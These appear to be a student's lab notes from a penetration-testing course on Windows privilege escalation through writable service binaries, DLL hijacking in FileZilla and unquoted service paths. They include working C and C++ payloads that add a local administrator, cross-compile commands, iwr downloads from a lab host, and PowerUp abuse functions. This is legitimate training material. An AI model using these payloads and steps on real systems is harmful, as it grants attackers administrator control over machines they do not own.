_Windows services are one of the main areas to analyze when searching for privilege escalation vectors_

### Service Binary Hijacking 

Each windows service has a binary file.

List all installed Windows services with
- `services.msc`
- `Get-Service`
- `Get-CimInstance`

_Note: when using WinRM or a bind shell, Get-CimInstance and Get-Service will show permission denied. RDP will work_

List of services with binary path

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Interesting results:

```
Name                      State   PathName
----                      -----   --------
Apache2.4                 Running "C:\xampp\apache\bin\httpd.exe" -k runservice

mysql                    Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
```

XAMPP services installed in `C:\xampp\` directory instead of `C:\Windows\System32` = user installed

Enumerate permissions on these service binaries using either
- icacls 
- `Get-ACL`

 icacls permissions mask

|Mask|Permissions|
|---|---|
|F|Full access|
|M|Modify access|
|RX|Read and execute access|
|R|Read-only access|
|W|Write-only access|
Using #icacls on Apache binary httpd.exe

```
icacls "C:\xampp\apache\bin\httpd.exe"
```

Result: Read and Execute 

```
C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
                              NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Users:(RX)
                              NT AUTHORITY\Authenticated Users:(RX)
```

dave is only in the _Users_ group and only has _Read and Execute_ (RX) rights. We can't replace the file with malicious binary.

Permissions of _mysqld.exe_ form mysql service

`icacls "C:\xampp\mysql\bin\mysqld.exe"`

Result: Full access

`BUILTIN\Users:(F)`

We can replace this binary. 

Generating our binary to replace mysqld.exe

adduser.c code
```C
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user cadet password1! /add");
  i = system ("net localgroup administrators cadet /add");
  
  return 0;
}
```

Cross-compile using #mingw-64 to 64-bit app

`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`

Transfer to target:

Start #pythonhttpserver 

Use #iwr to download the file from kali

`iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe`

Move original `mysqld.exe` to our home folder

`move C:\xampp\mysql\bin\mysqld.exe mysqld.exe`

Move malicious binary in

`move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe`

Attempting to stop the service in order to restart it

`net stop mysql`

Result: ACCESS DENIED 

dave can't stop the service

Checking if service's startup type is set to "Auto."

If it is, we can just reboot the machine. 

`Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}`

It is set to "Auto."

To issue a reboot, our user has to have `SeShutdownPrivilege`

Check with

`whoami /priv`

Result:

We do have it (seems unlikely that we wouldn't?)

Rebooting the machine

`shutdown /r /t 0`

Attack worked because dave2 did register as new administrator user

`Get-LocalGroupMember administrators`

User #RunAs to obtain interactive shell or use #msfvenom to create executable file for a reverse shell

To restore the original state of the service, we have to delete our binary **mysqld.exe**, restore the backed up original binary, and restart the system.

[[PowerUp]]
Using #PowerUp to see if it detects this priv esc vector

Copy PowerUp.ps1 to _kali_'s home directory and serve it with #pythonhttpserver 

`cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .

`python3 -m http.server 80`

Download #PowerUp with #iwr 

`iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1`

`powershell -ep bypass`

`. .\PowerUp.ps1`

Display services this user can modify

`Get-ModifiableServiceFile`

PowerUp did identify mysql to be vulnerable.

### DLL Hijacking

#### Scenario 

Replace a missing DLL with a malicious DLL 

Enumerating installed apps:

`Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`

Result:

`FileZilla 3.63.1`

This application has a #dllhijacking vulnerability

We'll attempt to replace the `textshaping.dll` with a malicious one

Determining if we can write to FileZilla directory

`echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'`

`type 'C:\FileZilla\FileZilla FTP Client\test.txt'`

We can. 

Use process monitor (if an admin) to get list of dlls used by a service binary.

Add Filter for filezilla.exe

Download this shit from microsoft sysinternals site. 

![Figure 5: Add Filter for filezilla.exe](https://static.offsec.com/offsec-courses/PEN-200/imgs/winprivesc/430e1aa80d980c8e9160be549733996c-privesc_svcdll_pmfilter.png)

Run the FileZilla app

Add Filters looking for CreateFile operations on paths containing TextShaping.dll

![Figure 7: Add Filters looking for CreateFile operations on paths containing TextShaping.dll](https://static.offsec.com/offsec-courses/PEN-200/imgs/winprivesc/96d3cc822281c7d597412e0b78698a2f-privesc_svcdll_dllsearch.png)

Resulting events after applying the filters

![Figure 8: Resulting events after applying the filters](https://static.offsec.com/offsec-courses/PEN-200/imgs/winprivesc/2108c3ff37a75c50a6d43d6ceb963e5b-privesc_svcdll_dllsearch_results.png)

We can attempt to write our own `TextShaping.dll` in C++

```C++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Cross-compiling this with #mingw-64 

`x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll`

`--shared` - specifies to build a DLL

Start #pythonhttpserver to serve up the DLL

Download compiled DLL with #iwr 

`iwr -uri http://192.168.48.3/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'`

The app needs to be started by an admin to create our new user.

### Unquoted Service Paths

Use this attack when we have Write permissions to a service's main directory or subdirectories but cannot replace files. 

If the Windows service path mapping to service binary contains one or more spaces and isn't quoted, we can insert a malicious binary and hijack execution flow.

Example of how Windows will try to locate the correct path of an unquoted service

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

##### Scenario

Open PowerShell and enumerate running and stopped services

`Get-CimInstance -ClassName win32_service | Select Name,State,PathName`

Result:

```
GammaService                             Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

The unquoted service binary path contains multiple spaces.

More effective tool to check for spaces and missing quotes is #wmic

`wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`

Result:

```
GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

Using Start-Service and Stop-Service to check if user steve has permissions to start and stop GammaService

`Start-Service GammaService`

`Stop-Service GammaService`

He does have permissions.

How Windows tries to locate the correct path of the unquoted service _GammaService_

```
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

Let's check our access rights in these paths with **icacls**

`icacls "C:\"`

Result: we can't write to this directory

```
NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
NT AUTHORITY\Authenticated Users:(AD)
```

`icacls "C:\Program Files"`

Result: we can't write to this directory either 

```
BUILTIN\Users:(RX)
BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
```

`icacls "C:\Program Files\Enterprise Apps"`

Result: we can write to this directory

```
BUILTIN\Users:(OI)(CI)(RX,W)
```

Re-using `adduser.exe` binary from "Service Binary Hijacking"

Start #pythonhttpserver 

Download `adduser.exe` as `Current.exe` to super cede `Current Version` folder

`iwr -uri http://192.168.48.3/adduser.exe -Outfile Current.exe`

Place into Enterprise Apps directory 

`copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'`

Start the service

`Start-Service GammaService`

Check to see if new user was added (he was!)

`net user`

Result:

`dave2`

`net localgroup administrators`

Restore original service by stopping the service and deleting Current.exe

Does #PowerUp discover this priv esc vector?

Transferring PowerUp.ps1 to target

`iwr http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1`

Set execution policy bypass

`powershell -ep bypass`

Use `Get-UnquotedService` flag 

`. .\PowerUp.ps1`

`Get-UnquotedService`

The GammaService was identified as vulnerable.

Use the AbuseFunction and restart the service 

Default behavior of AbuseFunction `Write-ServiceBinary: 
Create a new local user called _john_ with the password _Password123!_
Add this user to local _Administrators_ group

`Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"`

Restart service

`Restart-Service GammaService`

Verify user creation 

`net user`

Verified.
